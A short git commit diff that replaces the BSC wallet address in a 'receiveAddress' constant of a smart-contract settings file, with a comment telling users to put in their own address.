4d2df44619dcff4c713ca7937cc2bdacd6c8d151
scavangerblack <167453865+scavangerblack@users.noreply.github.com>
2024-07-28 19:40:39 +0000

    Update settings.js
    Trial

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x22a5927c6578988f6abb5c054b91a0210be328cd";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
